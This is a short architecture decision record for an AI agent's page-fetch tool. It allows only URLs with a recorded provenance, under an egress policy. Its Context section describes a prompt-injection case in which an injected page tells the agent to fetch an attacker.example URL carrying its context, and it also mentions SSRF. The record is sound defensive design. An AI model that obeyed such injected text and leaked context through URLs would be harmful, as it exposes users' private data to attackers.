# ADR-0006: URLs are fetchable only if they have a provenance origin in scope

- Status: Accepted, 2026-09-30

## Context
A fetch tool that accepts any URL a model asks for is an exfiltration channel: an injected page can tell the agent to
fetch `https://attacker.example/?q=<context>`. It is also an SSRF surface.

## Decision
`fetch_page` accepts a URL only if its normalised form was recorded in the caller's scope (run or MCP client session)
as a search result, user input, link on a fetched page, or provider record, **and** it passes the egress policy
(scheme and port allowlist, IP blocklist, pinned DNS, redirect re-validation, size, time and content-type limits,
robots.txt, domain controls). Redirects from an authorised URL are followed hop by hop under the egress policy.

## Consequences
- A model can choose among known URLs but can never compose one, so data can't be smuggled out in a URL.
- Every snapshot records the origin that authorised it, which completes the provenance chain.
- Some legitimate guesses (e.g. `/about` without a link to it) are refused. Acceptable: real pages link their important
  sections, and search covers the rest.

## Alternatives considered
- **Domain allowlists:** too restrictive for open research.
- **Egress policy only:** stops SSRF but not exfiltration to public hosts.
